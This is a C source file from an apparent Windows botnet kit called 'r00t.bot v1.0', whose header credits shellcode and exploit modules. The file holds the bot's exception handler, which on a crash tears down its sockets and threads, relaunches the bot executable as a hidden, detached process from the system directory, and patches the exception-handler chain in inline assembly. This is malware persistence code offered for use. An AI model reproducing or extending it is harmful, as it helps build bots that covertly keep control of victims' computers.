/*

        _______  _______   __    ___.           __   
_______ \   _  \ \   _  \_/  |_  \_ |__   _____/  |_ 
\_  __ \/  /_\  \/  /_\  \   __\  | __ \ /  _ \   __\
 |  | \/\  \_/   \  \_/   \  |    | \_\ (  <_> )  |  
 |__|    \_____  /\_____  /__|   /\___  /\____/|__|  
               \/ Affix \/       \/   \/ iHack.co.uk
			   
				 r00t.bot v1.0
				 ASN - Affix
				 SkySyn - Affix
				 Connection(recode) - Affix
				 Shellcode - h1dd3n
				 ftpd - Affix

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_EHANDLER

// globals
DWORD scratch;

EXCEPTION_DISPOSITION cdecl _except_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
	void *EstablisherFrame,struct _CONTEXT *ContextRecord,void *DispatcherContext)
{	

	// do some clean-up
	fclosesocket(threads[0].sock);
	killthreadall();
	fWSACleanup();
	fWSACleanup();
	Sleep(100);
	
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	#ifdef DEBUG_CONSOLE
	sinfo.wShowWindow = SW_SHOW;
	#else
	sinfo.wShowWindow = SW_HIDE;
	#endif
		
	char botfile[MAX_PATH],sysdir[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(NULL, botfile, sizeof(botfile));

	if (CreateProcess(NULL, botfile, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
		Sleep(100);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}

	// Change EAX in the context record so that it points to someplace
	// where we can successfully write
	ContextRecord->Eax = (DWORD)&scratch;

	_asm
	{                           // Remove our EXECEPTION_REGISTRATION record
		mov     eax,[ESP]       // Get pointer to previous record
		mov     FS:[0], EAX     // Install previous record
		add     esp, 8          // Clean our EXECEPTION_REGISTRATION off stack
	}

	ExitProcess(0);

	// Tell the OS to restart the faulting instruction
	return ExceptionContinueExecution;
}
#endif